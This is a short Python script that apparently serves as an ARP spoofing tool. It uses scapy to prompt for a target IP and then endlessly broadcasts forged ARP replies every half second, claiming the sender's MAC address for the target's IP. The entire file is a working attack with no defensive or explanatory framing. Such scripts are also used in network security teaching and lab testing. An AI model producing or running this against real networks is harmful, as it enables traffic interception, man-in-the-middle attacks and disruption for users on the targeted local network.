from scapy.all import sendp, Ether, ARP
from getmac import get_mac_address
from time import sleep

def get_ips() :
    target = input("enter target ip >")
    return target

def spoofer(target)  :
    my_mac = get_mac_address()
    while True :
        sendp(Ether(dst="ff:ff:ff:ff:ff:ff", src=my_mac) / ARP(op=2, hwsrc=my_mac,psrc=target))
        sleep(0.5)


def main():
    target = get_ips()
    spoofer(target)

if __name__ == "__main__":
    main()


